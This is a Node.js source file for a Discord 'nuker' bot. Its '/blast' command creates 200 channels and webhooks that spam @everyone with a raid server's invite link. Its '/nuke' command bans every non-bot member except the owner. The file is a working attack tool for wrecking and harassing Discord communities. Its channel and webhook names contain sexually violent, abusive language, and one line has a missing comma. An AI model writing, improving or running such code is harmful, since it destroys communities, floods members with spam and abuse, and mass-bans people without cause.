const express = require('express');
const {
  Client,
  GatewayIntentBits,
  Partials,
  SlashCommandBuilder,
  REST,
  Routes,
  PermissionFlagsBits,
  ChannelType,
  WebhookClient,
} = require('discord.js');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (_, res) => res.send('Bot is online'));
app.listen(PORT, () => console.log(`🌐 Web active on port ${PORT}`));

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers],
  partials: [Partials.GuildMember],
});

client.once('ready', async () => {
  console.log(`🤖 Logged in as ${client.user.tag}`);

  const commands = [
    new SlashCommandBuilder()
      .setName('blast')
      .setDescription('Create 200 channels + webhooks and ping everyone instantly')
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
      .toJSON(),
    new SlashCommandBuilder()
      .setName('nuke')
      .setDescription('Ban all non-bot members except owner')
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
      .toJSON(),
  ];

  const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);
  await rest.put(Routes.applicationCommands(client.user.id), { body: commands });

  console.log('✅ Slash commands registered');
});

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;
  const guild = interaction.guild;
  if (!guild) return interaction.reply({ content: '❌ Use this command in a server.', ephemeral: true });

  if (interaction.user.id !== process.env.OWNER_ID) {
    return interaction.reply({ content: '❌ You are not allowed.', ephemeral: true });
  }

  if (interaction.commandName === 'blast') {
    await interaction.reply('🚀 Creating 200 channels + webhooks and pinging...');

    const promises = [];
    for (let i = 1; i <= 200; i++) {
      promises.push(
        (async () => {
          try {
            const channel = await guild.channels.create({
              name: `raped-by-vanir`
              type: ChannelType.GuildText,
            });

            const webhook = await channel.createWebhook({
              name: `get fucked`,
              avatar: client.user.displayAvatarURL(),
            });

            await webhook.send({
              content: '@everyone https://discord.gg/vanir',
              allowedMentions: { parse: ['everyone'] },
            });

            console.log(`✅ Created and pinged vanir-${i}`);
          } catch (e) {
            console.error(`❌ Error at vanir-${i}:`, e.message);
          }
        })()
      );
    }

    await Promise.allSettled(promises);
    interaction.followUp('✅ Blast completed.');
  }

  if (interaction.commandName === 'nuke') {
    await interaction.reply('💣 Nuking members...');

    const members = await guild.members.fetch();
    for (const [id, member] of members) {
      if (id === process.env.OWNER_ID || member.user.bot) continue;

      try {
        await member.ban({ reason: 'Nuke' });
        console.log(`🔨 Banned ${member.user.tag}`);
      } catch (e) {
        console.error(`❌ Couldn’t ban ${member.user.tag}:`, e.message);
      }
    }

    interaction.followUp('✅ Nuke complete.');
  }
});

process.on('unhandledRejection', (err) => console.error('Unhandled:', err));
process.on('uncaughtException', (err) => console.error('Exception:', err));

client.login(process.env.TOKEN);
